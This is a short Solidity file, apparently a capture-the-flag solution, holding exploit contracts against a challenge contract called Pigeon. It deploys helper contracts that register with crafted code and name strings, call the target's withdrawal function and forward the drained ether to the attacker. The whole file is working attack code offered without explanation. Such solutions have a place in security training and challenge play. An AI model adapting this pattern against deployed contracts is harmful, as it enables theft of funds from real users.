// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./challenge/Setup.sol";

contract ExploitPigeon {
    constructor(address pigeonAddress, string memory code, string memory name) {
        Pigeon pigeon = Pigeon(pigeonAddress);
        bytes32 codeName = pigeon.becomeAPigeon(code, name);
        pigeon.flyAway(codeName, 0);
        msg.sender.call{value: address(this).balance}("");
    }
}

contract Exploit {
    address ownerAddress;

    function exploit(address pigeonAddress) public {
        ownerAddress = msg.sender;
        new ExploitPigeon(pigeonAddress, "Numbu", "h5");
        new ExploitPigeon(pigeonAddress, "Numbu", "h3");
        new ExploitPigeon(pigeonAddress, "Numbu", "h1");
    }

    receive() external payable {
        ownerAddress.call{value: address(this).balance}("");
    }
}
